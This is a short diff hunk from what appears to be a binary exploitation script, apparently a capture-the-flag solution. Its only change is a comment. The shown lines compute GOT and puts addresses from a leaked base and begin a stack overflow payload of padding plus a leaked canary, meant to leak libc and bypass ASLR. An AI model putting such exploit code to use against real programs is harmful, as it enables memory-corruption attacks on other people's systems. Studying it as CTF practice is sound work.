@@ -40,7 +40,7 @@ def exploit(p):
 	atoigot=0x201FC8+basebin
 	puts=basebin+0x920
 	ret=basebin+0xf2d
-	# leak libc
+	# leak libc => bypass ASLR
 	payload="a"*0x28
 	payload+=p64(canary)
 	payload+=p64(0)
